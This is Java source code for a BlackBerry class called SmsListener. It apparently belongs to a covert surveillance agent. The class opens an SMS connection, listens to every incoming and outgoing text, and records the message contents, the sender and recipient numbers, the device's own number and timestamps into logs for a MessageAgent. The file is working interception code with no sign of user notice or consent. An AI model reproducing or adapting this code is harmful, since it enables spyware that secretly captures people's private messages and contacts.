//#preprocess
package blackberry.agent.sms;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Date;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.DataBuffer;
import blackberry.agent.MessageAgent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class SmsListener {

    private static final int SMS_VERSION = 2010050501;

    private static final long GUID = 0xe78b740082783262L;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    private MessageConnection smsconn;
    private Thread inThread;
    private SMSInOutListener inoutsms;

    private MessageAgent messageAgent;

    static SmsListener instance;

    private SmsListener() {
    }

    public void setMessageAgent(final MessageAgent messageAgent) {
        this.messageAgent = messageAgent;
    }

    public synchronized static SmsListener getInstance() {

        if (instance == null) {
            instance = (SmsListener) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final SmsListener singleton = new SmsListener();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }

        return instance;
    }

    public synchronized boolean isRunning() {
        final boolean ret = smsconn != null;

        //#ifdef DBC
        Check.asserts((smsconn != null) == ret,
                "isRunning, bad status smsconn: " + ret);
        Check.asserts((inoutsms != null) == ret,
                "isRunning, bad status inoutsms: " + ret);
        Check.asserts((inThread != null) == ret,
                "isRunning, bad status inThread: " + ret);
        //#endif

        return ret;
    }

    public int getTotOut() {
        return SMSInOutListener.totOut;
    }

    public int getTotIn() {
        return SMSInOutListener.totIn;
    }

    public synchronized final void start() {
        if (isRunning()) {
            //#ifdef DEBUG
            debug.error("already running");
            //#endif
            return;
        }
        try {
            smsconn = (MessageConnection) Connector.open("sms://:0");

            //#ifdef DEBUG
            debug.trace("start: SMSListener");
            //#endif

            // TODO: trasformare in singleton?
            inoutsms = new SMSInOutListener(smsconn, this);
            //outsms = new SMSOUTListener(this);
            // insms = new SMSINListener(smsconn, this);

        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }

        inThread = new Thread(inoutsms);
        inThread.start();

        try {
            smsconn.setMessageListener(inoutsms);
        } catch (final IOException e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        }
    }

    public synchronized final void stop() {
        if (!isRunning()) {
            //#ifdef DEBUG
            debug.error("already not running");
            //#endif
            return;
        }

        //#ifdef DEBUG
        debug.info("Stopping SMSListener");
        //#endif
        try {
            if (smsconn != null) {
                //#ifdef DEBUG
                debug.trace("stop: smsconn");
                //#endif
                smsconn.close();
            }
            if (inoutsms != null) {
                //#ifdef DEBUG
                debug.trace("stop: inoutsms");
                //#endif
                inoutsms.stop();
            }

            if (inThread != null) {
                //#ifdef DEBUG
                debug.trace("stop: joining inThread");
                //#endif

                inThread.join();

                //#ifdef DEBUG
                debug.trace("stop: joined inThread");
                //#endif
            }

        } catch (final Exception e) {
            //#ifdef DEBUG
            debug.error(e);
            //#endif
        } finally {
            smsconn = null;
            inoutsms = null;
            inThread = null;
        }
    }

    public void run() {

    }

    synchronized boolean saveLog(
            final javax.wireless.messaging.Message message,
            final boolean incoming) {
        //#ifdef DBC
        Check.requires(message != null, "saveLog: null message");
        //#endif

        //#ifdef DEBUG
        debug.trace("saveLog: " + message);
        //#endif

        final byte[] dataMsg = getDataMessage(message);
        //#ifdef DBC
        Check.asserts(dataMsg != null, "saveLog: null dataMsg");
        //#endif

        //final ByteArrayOutputStream os = null;
        try {

            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;
            String address = message.getAddress();

            // Check if it's actually a sms

            final String prefix = "sms://";
            if (address.indexOf(prefix) == 0) {
                address = address.substring(prefix.length());
            } else {
                //#ifdef DEBUG
                debug.error("Not a sms");
                //#endif
                return false;
            }

            if (address.indexOf(":") > 0) {
                //#ifdef DEBUG
                debug.warn("Probably a MMS");
                //#endif
                return false;
            }

            // Filling fields

            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMyAddress();

            } else {
                from = getMyAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "saveLog: null filetime");
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from, 16));
            databuffer.write(Utils.padByteArray(to, 16));

            //#ifdef DEBUG
            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
            debug.info("From: " + from + " To: " + to + " date: "
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength());
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length);
            //#endif

            // Creating log
            if (dataMsg != null) {
                messageAgent
                        .createLog(additionalData, dataMsg, LogType.SMS_NEW);
                return true;
            } else {
                //#ifdef DEBUG
                debug.error("data null");
                //#endif

                return false;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveLog message: " + ex);
            //#endif
            return false;
        }
    }

    /**
     * @param message
     * @param dataMsg
     * @return
     */
    private byte[] getDataMessage(final javax.wireless.messaging.Message message) {

        byte[] dataMsg = null;

        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            final String msg = tm.getPayloadText();
            //#ifdef DEBUG
            debug.info("Got Text SMS: " + msg);
            //#endif

            dataMsg = WChar.getBytes(msg);

        } else if (message instanceof BinaryMessage) {
            dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                final String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        }
        return dataMsg;
    }

    private String getMyAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith("Unknown")) {
            return "local";
        }

        //#ifdef DBC
        Check
                .ensures(number.length() <= 16, "getMyAddress too long: "
                        + number);
        //#endif

        return number;
    }

}
